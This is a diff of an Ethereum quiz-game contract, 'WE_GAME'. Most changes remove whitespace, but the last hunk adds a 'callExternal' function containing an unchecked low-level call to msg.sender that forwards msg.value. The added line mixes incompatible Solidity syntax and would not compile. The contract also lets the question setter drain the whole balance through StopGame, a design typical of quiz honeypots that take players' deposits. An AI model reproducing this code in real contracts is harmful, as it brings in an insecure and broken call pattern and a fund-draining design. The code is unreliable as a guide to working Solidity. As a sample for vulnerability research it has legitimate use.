@@ -12,13 +12,13 @@ contract WE_GAME
             msg.sender.transfer(this.balance);
         }
     }
-    
+
     string public question;
- 
+
     address questionSender;
-  
+
     bytes32 responseHash;
- 
+
     function StartGame(string _question,string _response)
     public
     payable
@@ -30,7 +30,7 @@ contract WE_GAME
             questionSender = msg.sender;
         }
     }
-    
+
     function StopGame()
     public
     payable
@@ -38,7 +38,7 @@ contract WE_GAME
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
     }
-    
+
     function NewQuestion(string _question, bytes32 _responseHash)
     public
     payable
@@ -47,6 +47,9 @@ contract WE_GAME
         question = _question;
         responseHash = _responseHash;
     }
-    
+
     function() public payable{}
+	 function callExternal() public {
+   		msg.sender.call{value: msg.value, gas: 1000};
+  }
 }
